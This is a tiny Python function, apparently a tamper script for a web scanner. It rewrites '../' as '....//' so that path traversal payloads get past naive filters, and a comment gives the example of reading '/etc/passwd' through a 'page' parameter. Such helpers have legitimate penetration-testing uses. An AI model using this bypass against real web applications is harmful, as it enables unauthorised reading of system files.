# page=../../../../etc/passwd  =>  page=....//....//....//....//etc/passwd

def tamper(payload:str):
    if payload:
        payload=payload.replace('../','....//')
    return payload